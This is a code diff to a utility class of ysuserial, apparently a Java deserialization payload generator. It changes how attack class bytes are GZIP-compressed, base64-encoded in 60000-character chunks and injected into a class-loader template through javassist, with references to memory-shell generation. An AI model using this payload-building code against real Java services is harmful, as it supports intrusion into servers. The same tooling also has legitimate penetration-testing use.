@@ -2,6 +2,7 @@ package org.su18.ysuserial.payloads.util;
 
 import javassist.CannotCompileException;
 import javassist.CtClass;
+import javassist.CtMethod;
 import org.apache.bcel.classfile.Utility;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.StringUtils;
@@ -15,6 +16,7 @@ import java.util.zip.GZIPOutputStream;
 
 import static org.su18.ysuserial.payloads.config.Config.*;
 import static org.su18.ysuserial.payloads.config.Config.GEN_MEM_SHELL_FILENAME;
+import static org.su18.ysuserial.payloads.handle.ClassMethodHandler.insertMethod;
 import static org.su18.ysuserial.payloads.handle.ClassNameHandler.generateClassName;
 import static org.su18.ysuserial.payloads.handle.GlassHandler.shrinkBytes;
 
@@ -49,7 +51,7 @@ public class Utils {
 		String value = null;
 		try {
 			base64 = Class.forName("java.util.Base64");
-			Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
+			Object Encoder = base64.getMethod("getEncoder", new Class[]{}).invoke(null, (Object[]) null);
 			value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
 		} catch (Exception e) {
 			try {
@@ -68,7 +70,7 @@ public class Utils {
 		byte[] value = null;
 		try {
 			base64 = Class.forName("java.util.Base64");
-			Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
+			Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
 			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
 		} catch (Exception e) {
 			try {
@@ -133,18 +135,49 @@ public class Utils {
 		}
 	}
 
-	public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes, String name) throws Exception {
+	public static CtClass encapsulationByClassLoaderTemplate(byte[] bytes) throws Exception {
 		CtClass ctClass = POOL.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
 		ctClass.setName(generateClassName());
 		ByteArrayOutputStream outBuf           = new ByteArrayOutputStream();
 		GZIPOutputStream      gzipOutputStream = new GZIPOutputStream(outBuf);
 		gzipOutputStream.write(bytes);
 		gzipOutputStream.close();
-		String content   = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
-		String className = "className=\"" + name + "\";";
-		ctClass.makeClassInitializer().insertBefore(content);
-		ctClass.makeClassInitializer().insertBefore(className);
+
+		String b64 = Base64.encodeBase64String(outBuf.toByteArray());
+		// 如果 b64 的长度比较大，则将其切分为多个字符串进行拼接，避免单个字符串过长
+		String code = "";
+		if (b64.length() > 60000) {
+			String[] arrays = splitString(b64, 60000);
+			for (int i = 0; i < arrays.length; i++) {
+				if (i == 0) {
+					code += "b64=\"" + arrays[0] + "\";\n";
+				} else {
+					code += "b64 +=\"" + arrays[i] + "\";\n";
+				}
+			}
+		} else {
+			code += "b64=\"" + b64 + "\";\n";
+		}
+
+		// 将赋值的代码插入到 ClassLoaderTemplate 中
+		insertMethod(ctClass, "initClassBytes", code);
 		return ctClass;
 	}
+
+	public static String[] splitString(String str, int chunkSize) {
+		if (str == null || str.isEmpty() || chunkSize <= 0) {
+			return null;
+		}
+		int      len      = str.length();
+		int      arrayLen = (len + chunkSize - 1) / chunkSize;
+		String[] result   = new String[arrayLen];
+		int      k        = 0;
+		for (int i = 0; i < len; i += chunkSize) {
+			int endIndex = Math.min(i + chunkSize, len);
+			result[k++] = str.substring(i, endIndex);
+		}
+		return result;
+	}
+
 
 }
